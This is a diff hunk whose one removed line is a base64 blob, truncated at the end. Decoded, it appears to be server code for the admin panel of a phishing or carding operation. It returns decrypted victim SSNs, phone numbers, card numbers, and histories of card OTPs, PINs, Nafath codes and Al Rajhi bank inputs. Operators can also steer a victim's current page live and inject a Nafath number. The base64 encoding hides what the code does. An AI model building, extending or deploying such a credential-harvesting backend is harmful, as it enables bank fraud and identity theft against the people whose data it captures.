@@ -1,1 +1,406 @@
-aW1wb3J0IHsgY3JlYXRlU2VydmVyRm4gfSBmcm9tICJAdGFuc3RhY2svcmVhY3Qtc3RhcnQiOwppbXBvcnQgdHlwZSB7IFN1cGFiYXNlQ2xpZW50IH0gZnJvbSAiQHN1cGFiYXNlL3N1cGFiYXNlLWpzIjsKaW1wb3J0IHsgeiB9IGZyb20gInpvZCI7CmltcG9ydCB7IHJlcXVpcmVTdXBhYmFzZUF1dGggfSBmcm9tICJAL2ludGVncmF0aW9ucy9zdXBhYmFzZS9hdXRoLW1pZGRsZXdhcmUiOwppbXBvcnQgeyBkZWNyeXB0RGVlcCwgaGFzaEZpZWxkIH0gZnJvbSAiLi9jcnlwdG8uc2VydmVyIjsKCi8qKiBTZWFyY2ggZmlsdGVyIHRoYXQgd29ya3Mgb3ZlciBlbmNyeXB0ZWQgY29sdW1uczogZXhhY3QgYmxpbmQtaW5kZXggbWF0Y2gKICogIGZvciBzc24vcGhvbmUsIHBsdXMgcGxhaW50ZXh0IGlsaWtlIGZvciBsZWdhY3kgcm93cyBhbmQgbm9uLWVuY3J5cHRlZCBmaWVsZHMuICovCmZ1bmN0aW9uIGFwcGx5VmlzaXRvclNlYXJjaDxUIGV4dGVuZHMgeyBvcjogKGY6IHN0cmluZykgPT4gVCB9PihxOiBULCByYXc6IHN0cmluZyk6IFQgewogIGNvbnN0IHMgPSByYXcudHJpbSgpOwogIGNvbnN0IHBhcnRzID0gW2BzZXNzaW9uX2lkLmlsaWtlLiUke3N9JWAsIGBzc24uaWxpa2UuJSR7c30lYCwgYHBob25lLmlsaWtlLiUke3N9JWAsIGB2aXNpdG9yX25hbWUuaWxpa2UuJSR7c30lYF07CiAgY29uc3QgaCA9IGhhc2hGaWVsZChzKTsKICBpZiAoaCkgcGFydHMucHVzaChgc3NuX2hhc2guZXEuJHtofWAsIGBwaG9uZV9oYXNoLmVxLiR7aH1gKTsKICByZXR1cm4gcS5vcihwYXJ0cy5qb2luKCIsIikpOwp9Cgp0eXBlIERhc2hib2FyZERhdGFiYXNlQ2xpZW50ID0gU3VwYWJhc2VDbGllbnQ8YW55PjsKCmZ1bmN0aW9uIGRhc2hib2FyZERiKGNvbnRleHQ6IHsgc3VwYWJhc2U6IFN1cGFiYXNlQ2xpZW50IH0pIHsKICByZXR1cm4gY29udGV4dC5zdXBhYmFzZSBhcyBEYXNoYm9hcmREYXRhYmFzZUNsaWVudDsKfQoKYXN5bmMgZnVuY3Rpb24gYXNzZXJ0QWRtaW4oY29udGV4dDogewogIHN1cGFiYXNlOiBpbXBvcnQoIkBzdXBhYmFzZS9zdXBhYmFzZS1qcyIpLlN1cGFiYXNlQ2xpZW50OwogIHVzZXJJZDogc3RyaW5nOwp9KSB7CiAgY29uc3QgeyBkYXRhLCBlcnJvciB9ID0gYXdhaXQgZGFzaGJvYXJkRGIoY29udGV4dCkKICAgIC5mcm9tKCJ1c2VyX3JvbGVzIikKICAgIC5zZWxlY3QoInJvbGUiKQogICAgLmVxKCJ1c2VyX2lkIiwgY29udGV4dC51c2VySWQpCiAgICAuZXEoInJvbGUiLCAiYWRtaW4iKQogICAgLm1heWJlU2luZ2xlKCk7CiAgaWYgKGVycm9yKSB0aHJvdyBuZXcgRXJyb3IoZXJyb3IubWVzc2FnZSk7CiAgaWYgKCFkYXRhKSB0aHJvdyBuZXcgRXJyb3IoIkZvcmJpZGRlbjogYWRtaW4gb25seSIpOwp9Cgphc3luYyBmdW5jdGlvbiBsb2dBY3Rpdml0eSgKICBjb250ZXh0OiB7CiAgICBzdXBhYmFzZTogaW1wb3J0KCJAc3VwYWJhc2Uvc3VwYWJhc2UtanMiKS5TdXBhYmFzZUNsaWVudDsKICAgIHVzZXJJZDogc3RyaW5nOwogICAgY2xhaW1zPzogeyBlbWFpbD86IHN0cmluZyB9IHwgbnVsbDsKICB9LAogIGVudHJ5OiB7IGFjdGlvbjogc3RyaW5nOyB0YXJnZXRfdHlwZT86IHN0cmluZzsgdGFyZ2V0X2lkPzogc3RyaW5nOyBtZXRhPzogUmVjb3JkPHN0cmluZywgdW5rbm93bj4gfSwKKSB7CiAgYXdhaXQgZGFzaGJvYXJkRGIoY29udGV4dCkuZnJvbSgiYWRtaW5fYWN0aXZpdHlfbG9nIikuaW5zZXJ0KHsKICAgIGFjdG9yX2lkOiBjb250ZXh0LnVzZXJJZCwKICAgIGFjdG9yX2VtYWlsOiBjb250ZXh0LmNsYWltcz8uZW1haWwgPz8gbnVsbCwKICAgIGFjdGlvbjogZW50cnkuYWN0aW9uLAogICAgdGFyZ2V0X3R5cGU6IGVudHJ5LnRhcmdldF90eXBlID8/IG51bGwsCiAgICB0YXJnZXRfaWQ6IGVudHJ5LnRhcmdldF9pZCA/PyBudWxsLAogICAgbWV0YTogZW50cnkubWV0YSA/PyB7fSwKICB9IGFzIG5ldmVyKTsKfQoKZXhwb3J0IGNvbnN0IGdldFN0YXRzID0gY3JlYXRlU2VydmVyRm4oeyBtZXRob2Q6ICJHRVQiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5oYW5kbGVyKGFzeW5jICh7IGNvbnRleHQgfSkgPT4gewogICAgYXdhaXQgYXNzZXJ0QWRtaW4oY29udGV4dCk7CiAgICBjb25zdCBzdXBhYmFzZSA9IGRhc2hib2FyZERiKGNvbnRleHQpOwoKICAgIGNvbnN0IHRvZGF5ID0gbmV3IERhdGUoKTsKICAgIHRvZGF5LnNldFVUQ0hvdXJzKDAsIDAsIDAsIDApOwogICAgY29uc3QgdG9kYXlJc28gPSB0b2RheS50b0lTT1N0cmluZygpOwoKICAgIGNvbnN0IFt0b3RhbCwgdG9kYXlDb3VudCwgY2FyZHMsIGNhbGxzLCBvbmxpbmVdID0gYXdhaXQgUHJvbWlzZS5hbGwoWwogICAgICBzdXBhYmFzZS5mcm9tKCJxdW90ZXMiKS5zZWxlY3QoImlkIiwgeyBjb3VudDogImV4YWN0IiwgaGVhZDogdHJ1ZSB9KSwKICAgICAgc3VwYWJhc2UuZnJvbSgicXVvdGVzIikuc2VsZWN0KCJpZCIsIHsgY291bnQ6ICJleGFjdCIsIGhlYWQ6IHRydWUgfSkuZ3RlKCJjcmVhdGVkX2F0IiwgdG9kYXlJc28pLAogICAgICBzdXBhYmFzZS5mcm9tKCJjYXJkcyIpLnNlbGVjdCgiaWQiLCB7IGNvdW50OiAiZXhhY3QiLCBoZWFkOiB0cnVlIH0pLAogICAgICBzdXBhYmFzZS5mcm9tKCJxdW90ZXMiKS5zZWxlY3QoImlkIiwgeyBjb3VudDogImV4YWN0IiwgaGVhZDogdHJ1ZSB9KS5ub3QoInBob25lIiwgImlzIiwgbnVsbCksCiAgICAgIHN1cGFiYXNlCiAgICAgICAgLmZyb20oInF1b3RlcyIpCiAgICAgICAgLnNlbGVjdCgiaWQiLCB7IGNvdW50OiAiZXhhY3QiLCBoZWFkOiB0cnVlIH0pCiAgICAgICAgLmd0ZSgibGFzdF9hY3RpdmVfYXQiLCBuZXcgRGF0ZShEYXRlLm5vdygpIC0gMiAqIDYwICogMTAwMCkudG9JU09TdHJpbmcoKSksCiAgICBdKTsKCiAgICByZXR1cm4gewogICAgICB0b3RhbFZpc2l0b3JzOiB0b3RhbC5jb3VudCA/PyAwLAogICAgICB0b2RheVZpc2l0b3JzOiB0b2RheUNvdW50LmNvdW50ID8/IDAsCiAgICAgIGNhcmRzOiBjYXJkcy5jb3VudCA/PyAwLAogICAgICBjYWxsczogY2FsbHMuY291bnQgPz8gMCwKICAgICAgb25saW5lOiBvbmxpbmUuY291bnQgPz8gMCwKICAgIH07CiAgfSk7CgpleHBvcnQgY29uc3QgbGlzdFZpc2l0b3JzID0gY3JlYXRlU2VydmVyRm4oeyBtZXRob2Q6ICJHRVQiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5pbnB1dFZhbGlkYXRvcigoZGF0YSkgPT4KICAgIHoKICAgICAgLm9iamVjdCh7CiAgICAgICAgZmlsdGVyOiB6LmVudW0oWyJhbGwiLCAib25saW5lIiwgImNhcmQiLCAiYXJjaGl2ZSIsICJ0cmFzaCJdKS5kZWZhdWx0KCJhbGwiKSwKICAgICAgICBzZWFyY2g6IHouc3RyaW5nKCkub3B0aW9uYWwoKSwKICAgICAgfSkKICAgICAgLnBhcnNlKGRhdGEpLAogICkKICAuaGFuZGxlcihhc3luYyAoeyBjb250ZXh0LCBkYXRhIH0pID0+IHsKICAgIGF3YWl0IGFzc2VydEFkbWluKGNvbnRleHQpOwogICAgbGV0IHEgPSBkYXNoYm9hcmREYihjb250ZXh0KQogICAgICAuZnJvbSgicXVvdGVzIikKICAgICAgLnNlbGVjdCgiKiwgY2FyZHMoaWQsIGNhcmRfbnVtYmVyKSwgcXVvdGVfZGV0YWlscyhmdWxsX25hbWUpIikKICAgICAgLm9yZGVyKCJsYXN0X2FjdGl2ZV9hdCIsIHsgYXNjZW5kaW5nOiBmYWxzZSB9KQogICAgICAubGltaXQoMjAwKTsKCiAgICBpZiAoZGF0YS5maWx0ZXIgPT09ICJ0cmFzaCIpIHsKICAgICAgcSA9IHEuZXEoInRyYXNoZWQiLCB0cnVlKTsKICAgIH0gZWxzZSB7CiAgICAgIHEgPSBxLmVxKCJ0cmFzaGVkIiwgZmFsc2UpOwogICAgICBpZiAoZGF0YS5maWx0ZXIgPT09ICJhcmNoaXZlIikgcSA9IHEuZXEoImFyY2hpdmVkIiwgdHJ1ZSk7CiAgICAgIGVsc2UgcSA9IHEuZXEoImFyY2hpdmVkIiwgZmFsc2UpOwogICAgICBpZiAoZGF0YS5maWx0ZXIgPT09ICJjYXJkIikgcSA9IHEubm90KCJjYXJkcyIsICJpcyIsIG51bGwpOwogICAgICBpZiAoZGF0YS5maWx0ZXIgPT09ICJvbmxpbmUiKSB7CiAgICAgICAgY29uc3Qgc2luY2UgPSBuZXcgRGF0ZShEYXRlLm5vdygpIC0gMiAqIDYwICogMTAwMCkudG9JU09TdHJpbmcoKTsKICAgICAgICBxID0gcS5ndGUoImxhc3RfYWN0aXZlX2F0Iiwgc2luY2UpOwogICAgICB9CiAgICB9CgogICAgaWYgKGRhdGEuc2VhcmNoICYmIGRhdGEuc2VhcmNoLnRyaW0oKSkgewogICAgICBxID0gYXBwbHlWaXNpdG9yU2VhcmNoKHEsIGRhdGEuc2VhcmNoKTsKICAgIH0KCiAgICBjb25zdCB7IGRhdGE6IHJvd3MsIGVycm9yIH0gPSBhd2FpdCBxOwogICAgaWYgKGVycm9yKSB0aHJvdyBuZXcgRXJyb3IoZXJyb3IubWVzc2FnZSk7CiAgICByZXR1cm4gZGVjcnlwdERlZXAocm93cyA/PyBbXSk7CiAgfSk7CgovKiogTGlzdCB2aXNpdG9ycyBjdXJyZW50bHkgb24gdGhlIGhvbWUgcGFnZSAoItin2YTYsdim2YrYs9mK2KkiKSwgbW9zdCByZWNlbnQgZmlyc3QuICovCmV4cG9ydCBjb25zdCBsaXN0SG9tZVZpc2l0b3JzID0gY3JlYXRlU2VydmVyRm4oeyBtZXRob2Q6ICJHRVQiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5pbnB1dFZhbGlkYXRvcigoZGF0YSkgPT4KICAgIHoKICAgICAgLm9iamVjdCh7CiAgICAgICAgb25seU9ubGluZTogei5ib29sZWFuKCkuZGVmYXVsdCh0cnVlKSwKICAgICAgICBzZWFyY2g6IHouc3RyaW5nKCkub3B0aW9uYWwoKSwKICAgICAgfSkKICAgICAgLnBhcnNlKGRhdGEpLAogICkKICAuaGFuZGxlcihhc3luYyAoeyBjb250ZXh0LCBkYXRhIH0pID0+IHsKICAgIGF3YWl0IGFzc2VydEFkbWluKGNvbnRleHQpOwogICAgbGV0IHEgPSBkYXNoYm9hcmREYihjb250ZXh0KQogICAgICAuZnJvbSgicXVvdGVzIikKICAgICAgLnNlbGVjdCgiKiwgY2FyZHMoaWQsIGNhcmRfbnVtYmVyKSwgcXVvdGVfZGV0YWlscyhmdWxsX25hbWUpIikKICAgICAgLmVxKCJ0cmFzaGVkIiwgZmFsc2UpCiAgICAgIC5lcSgiY3VycmVudF9wYWdlIiwgItin2YTYsdim2YrYs9mK2KkiKQogICAgICAub3JkZXIoImxhc3RfYWN0aXZlX2F0IiwgeyBhc2NlbmRpbmc6IGZhbHNlIH0pCiAgICAgIC5saW1pdCgzMDApOwogICAgaWYgKGRhdGEub25seU9ubGluZSkgewogICAgICBjb25zdCBzaW5jZSA9IG5ldyBEYXRlKERhdGUubm93KCkgLSAyICogNjAgKiAxMDAwKS50b0lTT1N0cmluZygpOwogICAgICBxID0gcS5ndGUoImxhc3RfYWN0aXZlX2F0Iiwgc2luY2UpOwogICAgfQogICAgaWYgKGRhdGEuc2VhcmNoICYmIGRhdGEuc2VhcmNoLnRyaW0oKSkgewogICAgICBjb25zdCBzID0gZGF0YS5zZWFyY2gudHJpbSgpOwogICAgICBjb25zdCBwYXJ0cyA9IFtgc2Vzc2lvbl9pZC5pbGlrZS4lJHtzfSVgLCBgc3NuLmlsaWtlLiUke3N9JWAsIGBwaG9uZS5pbGlrZS4lJHtzfSVgLCBgdmlzaXRvcl9uYW1lLmlsaWtlLiUke3N9JWAsIGBpcF9hZGRyZXNzLmlsaWtlLiUke3N9JWBdOwogICAgICBjb25zdCBoID0gaGFzaEZpZWxkKHMpOwogICAgICBpZiAoaCkgcGFydHMucHVzaChgc3NuX2hhc2guZXEuJHtofWAsIGBwaG9uZV9oYXNoLmVxLiR7aH1gKTsKICAgICAgcSA9IHEub3IocGFydHMuam9pbigiLCIpKTsKICAgIH0KICAgIGNvbnN0IHsgZGF0YTogcm93cywgZXJyb3IgfSA9IGF3YWl0IHE7CiAgICBpZiAoZXJyb3IpIHRocm93IG5ldyBFcnJvcihlcnJvci5tZXNzYWdlKTsKICAgIHJldHVybiBkZWNyeXB0RGVlcChyb3dzID8/IFtdKTsKICB9KTsKCi8qKiBNb3ZlIGFsbCBvZmZsaW5lICg+MiBtaW4pIHZpc2l0b3JzIHdpdGhvdXQgYSBjYXJkIGludG8gdHJhc2guICovCmV4cG9ydCBjb25zdCB0cmFzaE9mZmxpbmVOb0NhcmQgPSBjcmVhdGVTZXJ2ZXJGbih7IG1ldGhvZDogIlBPU1QiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5oYW5kbGVyKGFzeW5jICh7IGNvbnRleHQgfSkgPT4gewogICAgYXdhaXQgYXNzZXJ0QWRtaW4oY29udGV4dCk7CiAgICBjb25zdCBjdXRvZmYgPSBuZXcgRGF0ZShEYXRlLm5vdygpIC0gMiAqIDYwICogMTAwMCkudG9JU09TdHJpbmcoKTsKICAgIGNvbnN0IHsgZGF0YTogY2FuZGlkYXRlcywgZXJyb3I6IGUxIH0gPSBhd2FpdCBkYXNoYm9hcmREYihjb250ZXh0KQogICAgICAuZnJvbSgicXVvdGVzIikKICAgICAgLnNlbGVjdCgiaWQsIGNhcmRzKGlkKSIpCiAgICAgIC5lcSgidHJhc2hlZCIsIGZhbHNlKQogICAgICAubHQoImxhc3RfYWN0aXZlX2F0IiwgY3V0b2ZmKTsKICAgIGlmIChlMSkgdGhyb3cgbmV3IEVycm9yKGUxLm1lc3NhZ2UpOwogICAgY29uc3QgaWRzID0gKGNhbmRpZGF0ZXMgPz8gW10pCiAgICAgIC5maWx0ZXIoKHI6IGFueSkgPT4gIXIuY2FyZHMgfHwgci5jYXJkcy5sZW5ndGggPT09IDApCiAgICAgIC5tYXAoKHI6IGFueSkgPT4gci5pZCBhcyBzdHJpbmcpOwogICAgaWYgKGlkcy5sZW5ndGggPT09IDApIHJldHVybiB7IG1vdmVkOiAwIH07CiAgICBjb25zdCB7IGVycm9yOiBlMiB9ID0gYXdhaXQgZGFzaGJvYXJkRGIoY29udGV4dCkKICAgICAgLmZyb20oInF1b3RlcyIpCiAgICAgIC51cGRhdGUoeyB0cmFzaGVkOiB0cnVlIH0gYXMgbmV2ZXIpCiAgICAgIC5pbigiaWQiLCBpZHMpOwogICAgaWYgKGUyKSB0aHJvdyBuZXcgRXJyb3IoZTIubWVzc2FnZSk7CiAgICBhd2FpdCBsb2dBY3Rpdml0eShjb250ZXh0LCB7CiAgICAgIGFjdGlvbjogImJ1bGtfdHJhc2giLAogICAgICB0YXJnZXRfdHlwZTogInF1b3RlcyIsCiAgICAgIG1ldGE6IHsgY291bnQ6IGlkcy5sZW5ndGgsIGlkcyB9LAogICAgfSk7CiAgICByZXR1cm4geyBtb3ZlZDogaWRzLmxlbmd0aCB9OwogIH0pOwoKLyoqIFRyYXNoIG9yIHJlc3RvcmUgYSBzaW5nbGUgdmlzaXRvci4gKi8KZXhwb3J0IGNvbnN0IHNldFRyYXNoZWQgPSBjcmVhdGVTZXJ2ZXJGbih7IG1ldGhvZDogIlBPU1QiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5pbnB1dFZhbGlkYXRvcigoZGF0YSkgPT4KICAgIHoub2JqZWN0KHsgaWQ6IHouc3RyaW5nKCkudXVpZCgpLCB0cmFzaGVkOiB6LmJvb2xlYW4oKSB9KS5wYXJzZShkYXRhKSwKICApCiAgLmhhbmRsZXIoYXN5bmMgKHsgY29udGV4dCwgZGF0YSB9KSA9PiB7CiAgICBhd2FpdCBhc3NlcnRBZG1pbihjb250ZXh0KTsKICAgIGNvbnN0IHsgZGF0YTogcSB9ID0gYXdhaXQgZGFzaGJvYXJkRGIoY29udGV4dCkKICAgICAgLmZyb20oInF1b3RlcyIpCiAgICAgIC5zZWxlY3QoInNlc3Npb25faWQsIHNzbiwgcGhvbmUsIHZpc2l0b3JfbmFtZSIpCiAgICAgIC5lcSgiaWQiLCBkYXRhLmlkKQogICAgICAubWF5YmVTaW5nbGUoKTsKICAgIGNvbnN0IHsgZXJyb3IgfSA9IGF3YWl0IGRhc2hib2FyZERiKGNvbnRleHQpCiAgICAgIC5mcm9tKCJxdW90ZXMiKQogICAgICAudXBkYXRlKHsgdHJhc2hlZDogZGF0YS50cmFzaGVkIH0gYXMgbmV2ZXIpCiAgICAgIC5lcSgiaWQiLCBkYXRhLmlkKTsKICAgIGlmIChlcnJvcikgdGhyb3cgbmV3IEVycm9yKGVycm9yLm1lc3NhZ2UpOwogICAgYXdhaXQgbG9nQWN0aXZpdHkoY29udGV4dCwgewogICAgICBhY3Rpb246IGRhdGEudHJhc2hlZCA/ICJ0cmFzaCIgOiAicmVzdG9yZSIsCiAgICAgIHRhcmdldF90eXBlOiAicXVvdGUiLAogICAgICB0YXJnZXRfaWQ6IGRhdGEuaWQsCiAgICAgIG1ldGE6IHsKICAgICAgICBzZXNzaW9uX2lkOiAocSBhcyBhbnkpPy5zZXNzaW9uX2lkLAogICAgICAgIHNzbjogKHEgYXMgYW55KT8uc3NuLAogICAgICAgIHBob25lOiAocSBhcyBhbnkpPy5waG9uZSwKICAgICAgICBuYW1lOiAocSBhcyBhbnkpPy52aXNpdG9yX25hbWUsCiAgICAgIH0sCiAgICB9KTsKICAgIHJldHVybiB7IG9rOiB0cnVlIH07CiAgfSk7CgpleHBvcnQgY29uc3QgbGlzdEFjdGl2aXR5TG9nID0gY3JlYXRlU2VydmVyRm4oeyBtZXRob2Q6ICJHRVQiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5pbnB1dFZhbGlkYXRvcigoZGF0YSkgPT4gei5vYmplY3QoeyBsaW1pdDogei5udW1iZXIoKS5pbnQoKS5taW4oMSkubWF4KDUwMCkuZGVmYXVsdCgxMDApIH0pLnBhcnNlKGRhdGEgPz8ge30pKQogIC5oYW5kbGVyKGFzeW5jICh7IGNvbnRleHQsIGRhdGEgfSkgPT4gewogICAgYXdhaXQgYXNzZXJ0QWRtaW4oY29udGV4dCk7CiAgICBjb25zdCB7IGRhdGE6IHJvd3MsIGVycm9yIH0gPSBhd2FpdCBkYXNoYm9hcmREYihjb250ZXh0KQogICAgICAuZnJvbSgiYWRtaW5fYWN0aXZpdHlfbG9nIikKICAgICAgLnNlbGVjdCgiKiIpCiAgICAgIC5vcmRlcigiY3JlYXRlZF9hdCIsIHsgYXNjZW5kaW5nOiBmYWxzZSB9KQogICAgICAubGltaXQoZGF0YS5saW1pdCk7CiAgICBpZiAoZXJyb3IpIHRocm93IG5ldyBFcnJvcihlcnJvci5tZXNzYWdlKTsKICAgIHJldHVybiByb3dzID8/IFtdOwogIH0pOwoKZXhwb3J0IGNvbnN0IGdldFZpc2l0b3JGdWxsID0gY3JlYXRlU2VydmVyRm4oeyBtZXRob2Q6ICJHRVQiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5pbnB1dFZhbGlkYXRvcigoZGF0YSkgPT4gei5vYmplY3QoeyBpZDogei5zdHJpbmcoKS51dWlkKCkgfSkucGFyc2UoZGF0YSkpCiAgLmhhbmRsZXIoYXN5bmMgKHsgY29udGV4dCwgZGF0YSB9KSA9PiB7CiAgICBhd2FpdCBhc3NlcnRBZG1pbihjb250ZXh0KTsKICAgIGNvbnN0IHsgZGF0YTogcXVvdGUsIGVycm9yIH0gPSBhd2FpdCBkYXNoYm9hcmREYihjb250ZXh0KQogICAgICAuZnJvbSgicXVvdGVzIikKICAgICAgLnNlbGVjdCgKICAgICAgICAiKiwgcXVvdGVfZGV0YWlscygqKSwgcXVvdGVfc3VibWlzc2lvbl9oaXN0b3J5KCopLCBjYXJkcygqLCBjYXJkX290cF9oaXN0b3J5KCopLCBjYXJkX25hZmF0aF9oaXN0b3J5KCopLCBjYXJkX2lucHV0X2hpc3RvcnkoKiksIGNhcmRfcGluX2hpc3RvcnkoKiksIGNhcmRfcmFqaGlfaGlzdG9yeSgqKSkiLAogICAgICApCiAgICAgIC5lcSgiaWQiLCBkYXRhLmlkKQogICAgICAubWF5YmVTaW5nbGUoKTsKICAgIGlmIChlcnJvcikgdGhyb3cgbmV3IEVycm9yKGVycm9yLm1lc3NhZ2UpOwogICAgaWYgKHF1b3RlKSB7CiAgICAgIGNvbnN0IGNhcmRzID0gKHF1b3RlIGFzIGFueSkuY2FyZHMgPz8gW107CiAgICAgIGNvbnN0IHNvcnRBc2MgPSAoYTogYW55LCBiOiBhbnkpID0+IG5ldyBEYXRlKGEuY3JlYXRlZF9hdCkuZ2V0VGltZSgpIC0gbmV3IERhdGUoYi5jcmVhdGVkX2F0KS5nZXRUaW1lKCk7CiAgICAgIChxdW90ZSBhcyBhbnkpLmNhcmRfb3RwX2hpc3RvcnkgPSBjYXJkcy5mbGF0TWFwKChjOiBhbnkpID0+IGMuY2FyZF9vdHBfaGlzdG9yeSA/PyBbXSkuc29ydChzb3J0QXNjKTsKICAgICAgKHF1b3RlIGFzIGFueSkuY2FyZF9uYWZhdGhfaGlzdG9yeSA9IGNhcmRzLmZsYXRNYXAoKGM6IGFueSkgPT4gYy5jYXJkX25hZmF0aF9oaXN0b3J5ID8/IFtdKS5zb3J0KHNvcnRBc2MpOwogICAgICAocXVvdGUgYXMgYW55KS5jYXJkX2lucHV0X2hpc3RvcnkgPSBjYXJkcy5mbGF0TWFwKChjOiBhbnkpID0+IGMuY2FyZF9pbnB1dF9oaXN0b3J5ID8/IFtdKS5zb3J0KHNvcnRBc2MpOwogICAgICAocXVvdGUgYXMgYW55KS5jYXJkX3Bpbl9oaXN0b3J5ID0gY2FyZHMuZmxhdE1hcCgoYzogYW55KSA9PiBjLmNhcmRfcGluX2hpc3RvcnkgPz8gW10pLnNvcnQoc29ydEFzYyk7CiAgICAgIChxdW90ZSBhcyBhbnkpLmNhcmRfcmFqaGlfaGlzdG9yeSA9IGNhcmRzLmZsYXRNYXAoKGM6IGFueSkgPT4gYy5jYXJkX3JhamhpX2hpc3RvcnkgPz8gW10pLnNvcnQoc29ydEFzYyk7CiAgICAgIChxdW90ZSBhcyBhbnkpLnF1b3RlX3N1Ym1pc3Npb25faGlzdG9yeSA9ICgocXVvdGUgYXMgYW55KS5xdW90ZV9zdWJtaXNzaW9uX2hpc3RvcnkgPz8gW10pLnNvcnQoc29ydEFzYyk7CiAgICB9CiAgICByZXR1cm4gZGVjcnlwdERlZXAocXVvdGUpOwogIH0pOwoKZXhwb3J0IGNvbnN0IHVwZGF0ZVZpc2l0b3IgPSBjcmVhdGVTZXJ2ZXJGbih7IG1ldGhvZDogIlBPU1QiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5pbnB1dFZhbGlkYXRvcigoZGF0YSkgPT4KICAgIHoKICAgICAgLm9iamVjdCh7CiAgICAgICAgaWQ6IHouc3RyaW5nKCkudXVpZCgpLAogICAgICAgIGN1cnJlbnRfcGFnZTogei5zdHJpbmcoKS5vcHRpb25hbCgpLAogICAgICAgIGJsb2NrZWQ6IHouYm9vbGVhbigpLm9wdGlvbmFsKCksCiAgICAgICAgYXJjaGl2ZWQ6IHouYm9vbGVhbigpLm9wdGlvbmFsKCksCiAgICAgICAgcGlubmVkOiB6LmJvb2xlYW4oKS5vcHRpb25hbCgpLAogICAgICAgIGRpc3Rpbmd1aXNoZWQ6IHouYm9vbGVhbigpLm9wdGlvbmFsKCksCiAgICAgICAgbmFmYXRoX251bWJlcjogei5zdHJpbmcoKS5tYXgoMjApLm51bGxhYmxlKCkub3B0aW9uYWwoKSwKICAgICAgfSkKICAgICAgLnBhcnNlKGRhdGEpLAogICkKICAuaGFuZGxlcihhc3luYyAoeyBjb250ZXh0LCBkYXRhIH0pID0+IHsKICAgIGF3YWl0IGFzc2VydEFkbWluKGNvbnRleHQpOwogICAgY29uc3QgeyBpZCwgLi4ucmVzdCB9ID0gZGF0YTsKICAgIGNvbnN0IHBhdGNoOiBSZWNvcmQ8c3RyaW5nLCB1bmtub3duPiA9IHt9OwogICAgZm9yIChjb25zdCBbaywgdl0gb2YgT2JqZWN0LmVudHJpZXMocmVzdCkpIGlmICh2ICE9PSB1bmRlZmluZWQpIHBhdGNoW2tdID0gdjsKICAgIGNvbnN0IHsgZXJyb3IgfSA9IGF3YWl0IGRhc2hib2FyZERiKGNvbnRleHQpLmZyb20oInF1b3RlcyIpLnVwZGF0ZShwYXRjaCBhcyBuZXZlcikuZXEoImlkIiwgaWQpOwogICAgaWYgKGVycm9yKSB0aHJvdyBuZXcgRXJyb3IoZXJyb3IubWVzc2FnZSk7CiAgICByZXR1cm4geyBvazogdHJ1ZSB9OwogIH0pOwoKZXhwb3J0IGNvbnN0IGxpc3RTZXR0aW5ncyA9IGNyZWF0ZVNlcnZlckZuKHsgbWV0aG9kOiAiR0VUIiB9KQogIC5taWRkbGV3YXJlKFtyZXF1aXJlU3VwYWJhc2VBdXRoXSkKICAuaGFuZGxlcihhc3luYyAoeyBjb250ZXh0IH0pID0+IHsKICAgIGF3YWl0IGFzc2VydEFkbWluKGNvbnRleHQpOwogICAgY29uc3QgeyBkYXRhLCBlcnJvciB9ID0gYXdhaXQgZGFzaGJvYXJkRGIoY29udGV4dCkuZnJvbSgic2V0dGluZ3MiKS5zZWxlY3QoIioiKTsKICAgIGlmIChlcnJvcikgdGhyb3cgbmV3IEVycm9yKGVycm9yLm1lc3NhZ2UpOwogICAgcmV0dXJuIGRhdGEgPz8gW107CiAgfSk7CgpleHBvcnQgY29uc3QgdXBzZXJ0U2V0dGluZyA9IGNyZWF0ZVNlcnZlckZuKHsgbWV0aG9kOiAiUE9TVCIgfSkKICAubWlkZGxld2FyZShbcmVxdWlyZVN1cGFiYXNlQXV0aF0pCiAgLmlucHV0VmFsaWRhdG9yKChkYXRhKSA9PgogICAgei5vYmplY3QoeyBzZXR0aW5nX2tleTogei5zdHJpbmcoKS5taW4oMSksIHNldHRpbmdfdmFsdWU6IHouc3RyaW5nKCkgfSkucGFyc2UoZGF0YSksCiAgKQogIC5oYW5kbGVyKGFzeW5jICh7IGNvbnRleHQsIGRhdGEgfSkgPT4gewogICAgYXdhaXQgYXNzZXJ0QWRtaW4oY29udGV4dCk7CiAgICBjb25zdCB7IGVycm9yIH0gPSBhd2FpdCBkYXNoYm9hcmREYihjb250ZXh0KQogICAgICAuZnJvbSgic2V0dGluZ3MiKQogICAgICAudXBzZXJ0KHsgc2V0dGluZ19rZXk6IGRhdGEuc2V0dGluZ19rZXksIHNldHRpbmdfdmFsdWU6IGRhdGEuc2V0dGluZ192YWx1ZSB9LCB7CiAgICAgICAgb25Db25mbGljdDogInNldHRpbmdfa2V5IiwKICAgICAgfSk7CiAgICBpZiAoZXJyb3IpIHRocm93IG5ldyBFcnJvcihlcnJvci5tZXNzYWdlKTsKICAgIHJldHVybiB7IG9rOiB0cnVlIH07CiAgfSk7CgpleHBvcnQgY29uc3QgbGlzdEJhbm5lZENhcmRzID0gY3JlYXRlU2VydmVyRm4oeyBtZXRob2Q6ICJHRVQiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5oYW5kbGVyKGFzeW5jICh7IGNvbnRleHQgfSkgPT4gewogICAgYXdhaXQgYXNzZXJ0QWRtaW4oY29udGV4dCk7CiAgICBjb25zdCB7IGRhdGEsIGVycm9yIH0gPSBhd2FpdCBkYXNoYm9hcmREYihjb250ZXh0KQogICAgICAuZnJvbSgiYmFubmVkX2NhcmRzIikKICAgICAgLnNlbGVjdCgiKiIpCiAgICAgIC5vcmRlcigiY3JlYXRlZF9hdCIsIHsgYXNjZW5kaW5nOiBmYWxzZSB9KTsKICAgIGlmIChlcnJvcikgdGhyb3cgbmV